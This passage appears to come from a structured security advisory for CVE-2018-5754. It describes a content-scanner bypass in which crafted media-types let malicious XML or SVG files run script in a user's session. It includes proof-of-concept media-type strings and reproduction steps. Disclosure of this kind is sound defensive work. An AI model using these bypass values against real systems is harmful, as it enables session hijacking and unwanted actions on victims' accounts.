2018-01-12\nSolution date: 2018-04-24\nPublic disclosure: 2018-06-08\nResearcher Credits: Secator\nCVE reference: CVE-2018-5754\nCVSS: 5.4 (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n\nVulnerability Details:\nMedia-types can be altered in a way that our content scanner is circumvented and potentially harmful content gets passed to the requesting client.\n\nRisk:\nMalicious script code can be executed within a users context. This can lead to session hijacking or triggering unwanted actions via the web interface (sending mail, deleting data etc.).\n\nSteps to reproduce:\n1. Create a malicious XML file and modify its media-type\n2. Upload, embed and make someone open this file\n\nProof of concept:\n\"t,text/html\" or \"t/@,image/svg+xml\"\n\"garbage\\u00ff/garbage\" (will work for Firefox as it \"guesses\" the media-type based on the filename and multipart data)\n\nSolution:\nWe now reject to define media-types which are not covered by application logic."
        }
    }
]